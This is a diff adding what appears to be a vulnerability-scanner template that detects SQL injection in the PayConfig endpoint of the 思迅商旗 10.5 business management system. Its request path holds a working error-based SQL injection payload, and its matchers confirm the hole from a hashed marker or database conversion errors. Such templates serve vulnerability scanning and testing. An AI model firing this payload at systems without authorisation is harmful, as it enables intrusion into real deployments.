@@ -1,0 +1,27 @@
+id: poc-yaml-sixun-scms-payconfig-sqli
+info:
+  name: 思迅商旗10.5商业管理系统 PayConfig SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: GET
+    path:
+      - /api/Dinner/PayConfig?branchno&tableno=1'+AND+1234+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))--&uuid
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "<Success>false</Success>"
+          - "DinnerResponseDTO"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
